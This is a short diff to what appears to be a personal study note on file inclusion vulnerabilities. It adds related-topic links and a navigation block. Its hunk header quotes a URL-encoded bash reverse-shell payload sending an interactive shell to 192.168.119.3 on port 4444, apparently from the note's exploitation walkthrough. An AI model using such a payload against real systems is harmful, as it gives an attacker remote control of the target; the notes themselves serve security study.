@@ -330,3 +330,15 @@ bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%2
 > Exploiting these kinds of vulnerabilities is very similar across
 > these languages.
 > ```
+
+---
+%% graph-links %%
+## Related
+- [[Remote file inclusion (RFI)]]
+- [[PHP wrappers]]
+- [[Identifying and exploiting directory traversals]]
+- [[Command Injection]]
+
+> [!info] Navigation
+> Section: [[Web Applications/Common Web Application Attacks/File Inclusion Vulnerabilities/_index|File Inclusion Vulnerabilities]] · Home: [[🏠 Home]]
+
